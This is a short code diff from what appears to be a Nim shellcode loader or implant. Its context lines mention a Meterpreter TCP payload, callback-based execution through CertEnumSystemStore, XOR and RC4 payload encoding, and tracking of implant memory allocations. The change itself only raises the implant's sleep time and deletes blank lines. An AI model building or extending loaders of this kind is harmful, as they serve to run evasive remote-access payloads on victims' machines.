@@ -15,7 +15,7 @@ const shellcFile = protectString("x64_meterpreter_tcp")
 #   2 = CertEnumSystemStore callback
 const execMethod = 2
 # Implant sleep time
-const sleepTime = 10 * 1000
+const sleepTime = 30 * 1000
 # Encoding method
 #   1 = Simple byte xor
 #   2 = RC4 using SystemFunction032
@@ -180,8 +180,6 @@ proc myVirtualAlloc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, 
     implantAllocs.add((allocated, dwSize))
 
     return allocated
-
-
 
 
 when isMainModule:
